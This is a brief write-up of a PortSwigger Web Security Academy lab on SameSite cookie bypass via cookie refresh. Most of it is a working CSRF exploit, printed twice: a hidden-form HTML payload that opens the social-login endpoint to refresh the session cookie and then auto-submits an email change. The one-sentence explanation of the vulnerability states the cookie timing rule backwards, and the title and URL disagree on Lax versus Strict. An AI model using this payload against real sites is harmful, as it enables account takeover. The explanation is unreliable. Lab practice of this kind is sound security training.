# Lab: SameSite Lax bypass via cookie refresh (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)

**Task (from PortSwigger):**  
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address.

## Vulnerability
New session cookies set with Lax are not sent on cross-site POST for a short window after being set via cross-site navigation; forcing a same-site OAuth/social-login refresh re-issues a cookie that is eligible, then POST CSRF works after a short delay.

## Solution

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(() => document.forms[0].submit(), 5000);
</script>
```

(Adjust path if the lab uses `/oauth-login` or similar — follow proxy history for the auto-login endpoint.)

## Final Exploit Payload
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(() => document.forms[0].submit(), 5000);
</script>
```
